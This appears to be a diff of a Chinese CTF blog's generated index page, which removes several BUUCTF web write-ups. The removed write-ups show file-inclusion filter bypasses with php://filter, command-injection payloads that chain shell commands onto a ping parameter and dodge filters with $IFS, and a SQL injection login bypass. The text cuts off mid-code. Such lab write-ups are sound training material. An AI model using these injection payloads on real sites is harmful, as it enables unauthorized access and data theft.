+<p><strong>1-10:OK</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/23/Systemlearning-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/23/Systemlearning-1/" class="post-title-link" itemprop="url">Systemlearning-1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-23 22:24:04" itemprop="dateCreated datePublished" datetime="2021-01-23T22:24:04+08:00">2021-01-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -184,6 +744,13 @@
 
               <time title="创建时间：2021-01-17 09:07:45" itemprop="dateCreated datePublished" datetime="2021-01-17T09:07:45+08:00">2021-01-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-16 17:23:25" itemprop="dateModified" datetime="2021-04-16T17:23:25+08:00">2021-04-16</time>
+              </span>
 
           
 
@@ -460,556 +1027,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE2/" class="post-title-link" itemprop="url">伪协议2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-06 10:14:18 / 修改时间：10:22:38" itemprop="dateCreated datePublished" datetime="2020-12-06T10:14:18+08:00">2020-12-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="1-题目"><a href="#1-题目" class="headerlink" title="1.题目"></a>1.题目</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $a=str_replace(<span class="string">&quot;troye&quot;</span>,<span class="string">&quot;&quot;</span>,$file);</span><br><span class="line">        <span class="keyword">include</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#不对劲，总感觉写错了啥，算了,继续吃柠檬~</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h6><p>这次是大写也过滤了，没辙了……</p>
-<p>但是下面又有了新语句，$a=str_replace(“troye”,””,$file);</p>
-<p>检测troye并从字符串中去掉，把troye混进去就可以绕过了。</p>
-<p><em>payload：?file=PH<strong>troye</strong>P://filter/read=convert.BAS<strong>troye</strong>E64-encode/resource=flag</em></p>
-<blockquote>
-<p>em，没了</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE1/" class="post-title-link" itemprop="url">伪协议1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-06 09:47:04 / 修改时间：10:13:49" itemprop="dateCreated datePublished" datetime="2020-12-06T09:47:04+08:00">2020-12-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="1-题目"><a href="#1-题目" class="headerlink" title="1.题目"></a>1.题目</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#不对劲，总感觉写错了啥，算了，先去吃柠檬~</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE1/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/06/GXYCTF2019-PingPingPing/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/06/GXYCTF2019-PingPingPing/" class="post-title-link" itemprop="url">GXYCTF2019-PingPingPing</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-06 09:44:16 / 修改时间：09:45:41" itemprop="dateCreated datePublished" datetime="2020-12-06T09:44:16+08:00">2020-12-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h6 id="1-题目链接：https-buuoj-cn-challenges-GXYCTF2019-Ping-20Ping-20Ping"><a href="#1-题目链接：https-buuoj-cn-challenges-GXYCTF2019-Ping-20Ping-20Ping" class="headerlink" title="1.题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping"></a>1.题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping">https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping</a></h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
-<p>ping功能原理是向网络上的机器的唯一确定的IP地址发送一个数据包，对方就要返回一个同样大小的数据包，根据返回的数据包我们可以确定目标主机的存在，两台网络机器是否连接相通，时延是多少。</p>
-</blockquote>
-<p>在进行ping功能的命令同时，可使其同时执行额外的其他命令</p>
-<blockquote>
-<p>这需要用到一些命令管道符：</p>
-<p>|：直接执行后面的语句</p>
-<p>||：如果前面的语句执行出错，则执行后面的语句，否则仅执行前面的语句</p>
-<p>&amp;：前后的语句均可执行，但是前面的语句如果执行结果为假（即执行失败），则仅输出后面语句的结果</p>
-<p>&amp;&amp;：如果前面的语句为假，则直接报错，也不执行后面的语句</p>
-<p>;：多个语句不互相影响</p>
-<p>详细：<em><a target="_blank" rel="noopener" href="https://blog.csdn.net/youshaoduo/article/details/106607038">https://blog.csdn.net/youshaoduo/article/details/106607038</a></em></p>
-</blockquote>
-<p>所以用：?ip=127.0.0.1||ls，可以得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
-
-<p>用cat flag，显示：/?ip= fxck your space!</p>
-<p><em>……</em></p>
-<p>cat&lt;&gt;flag =&gt; /?ip= 1fxck your symbol!</p>
-<blockquote>
-<p>这里有一个关于空格的过滤：</p>
-<p>{IFS}，$IFS$9，$IFS$1，&lt;，&lt;&gt;，{cat,test.txt} ，……</p>
-<p>cmd=$’\x20test.txt’&amp;&amp;cat$cmd</p>
-<p>x20为16进制数，为32，\转义字符根据ASCII表，为空格……</p>
-</blockquote>
-<p>payload中有flag：/?ip= 1fxck your flag!……</p>
-<p>先访问index.php，payload：?ip=127.0.0.1||cat$IFS$9index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>显示了具体的过滤机制，如果要绕过flag的匹配，可以考虑借助$a，进行拼接。</p>
-<p><strong><em>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</em></strong></p>
-<blockquote>
-<p>em，拼接好像只能在最后一位，不然好像会出现变量名识别的错误……</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;flag&#123;835db201-f524-4497-a7f5-fca850954a63&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>好像是当做php语句执行了，查看源码可以看到（大概）……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/06/BuuCTF-WEB%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E9%A2%98-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/06/BuuCTF-WEB%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E9%A2%98-1/" class="post-title-link" itemprop="url">BuuCTF-WEB部分基础题-1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-06 09:42:04 / 修改时间：09:43:31" itemprop="dateCreated datePublished" datetime="2020-12-06T09:42:04+08:00">2020-12-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="BuuCTF-WEB部分基础题（1）"><a href="#BuuCTF-WEB部分基础题（1）" class="headerlink" title="BuuCTF-WEB部分基础题（1）"></a>BuuCTF-WEB部分基础题（1）</h3><blockquote>
-<p>感觉这些题单独写有点少……所以写一块。</p>
-</blockquote>
-<h4 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h4><h6 id="1-题目链接：https-buuoj-cn-challenges-ACTF2020-20-E6-96-B0-E7-94-9F-E8-B5-9B-Include"><a href="#1-题目链接：https-buuoj-cn-challenges-ACTF2020-20-E6-96-B0-E7-94-9F-E8-B5-9B-Include" class="headerlink" title="1.题目链接：https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include"></a>1.题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include">https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include</a></h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>题目说明’include’为文件包含漏洞。打开后有一个tips，点开后URL出现了file=flag.php.的调用。</p>
-<p>flag应该在flag.php中，但是以php语句解释并运行，导致flag无法正常显示……</p>
-<p>所以可以在中间对其进行base64编码，使其无法运行……</p>
-<p>payload：?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>base64解码后：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;d962dde8-63dd-4b9d-bed6-ca2d1234e05a&#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>em，原来是注释掉了……</p>
-</blockquote>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><h6 id="1-题目链接：https-buuoj-cn-challenges-E6-9E-81-E5-AE-A2-E5-A4-A7-E6-8C-91-E6-88-98-202019-EasySQL"><a href="#1-题目链接：https-buuoj-cn-challenges-E6-9E-81-E5-AE-A2-E5-A4-A7-E6-8C-91-E6-88-98-202019-EasySQL" class="headerlink" title="1.题目链接：https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL"></a>1.题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL</a></h6><h6 id="2-过程：-1"><a href="#2-过程：-1" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
-<p>我是cl4y，是一个WEB开发程序员，最近我做了一个网站，快来看看它有多精湛叭！</p>
-<p>SQL也是刚学，找个简单的练练手……</p>
-</blockquote>
-<p>打开之后是一个用户登录界面。</p>
-<p>随便一输，回显“NO,Wrong username password！！！”</p>
-<p>试试我新学的<em>万能密码</em></p>
-<p>1&#39; or 1=1#</p>
-<blockquote>
-<p>&#39;闭合掉上一个语句，or 1=1 恒true，#注释掉后面的语句</p>
-</blockquote>
-<p>结果直接把flag打出来了……</p>
-<p><strong><em>flag{44c19f5a-76e2-4d2a-b95f-50755985dc5a}</em></strong></p>
-<blockquote>
-<p>……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SecretFile/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SecretFile/" class="post-title-link" itemprop="url">极客大挑战-2019-SecretFile</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-06 09:15:25 / 修改时间：09:39:54" itemprop="dateCreated datePublished" datetime="2020-12-06T09:15:25+08:00">2020-12-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="1-题目链接：-https-buuoj-cn-challenges-E6-9E-81-E5-AE-A2-E5-A4-A7-E6-8C-91-E6-88-98-202019-Secret-20File-https-buuoj-cn-challenges-极客大挑战-2019-Secret-File"><a href="#1-题目链接：-https-buuoj-cn-challenges-E6-9E-81-E5-AE-A2-E5-A4-A7-E6-8C-91-E6-88-98-202019-Secret-20File-https-buuoj-cn-challenges-极客大挑战-2019-Secret-File" class="headerlink" title="1.题目链接：[https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019\]Secret%20File](https://buuoj.cn/challenges#[极客大挑战 2019]Secret File)"></a>1.题目链接：[<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019\]Secret%20File]">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019\]Secret%20File]</a>(<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://buuoj.cn/challenges#[极客大挑战</a> 2019]Secret File)</h6>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/12/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SecretFile/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/01/5-HCTF-2018-WarmUp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/01/5-HCTF-2018-WarmUp/" class="post-title-link" itemprop="url">5.HCTF-2018-WarmUp</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-01 12:58:45 / 修改时间：14:25:22" itemprop="dateCreated datePublished" datetime="2020-12-01T12:58:45+08:00">2020-12-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h6 id="题目地址：https-buuoj-cn-challenges"><a href="#题目地址：https-buuoj-cn-challenges" class="headerlink" title="题目地址：https://buuoj.cn/challenges"></a>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></h6><h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>网页上打开就只有一个大滑稽，网页名是Document，所以是文件包含？提交file参数，一直是：you can’t see it。</p>
-<p>题目标签是代码审计，我也没看到代码啊……</p>
-<blockquote>
-<p><em>查看源代码看到source.php内心毫无波澜，后来查找才知道要访问它……（菜\</em>1）*</p>
-</blockquote>
-<p>好，访问source.php我终于看到代码了：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 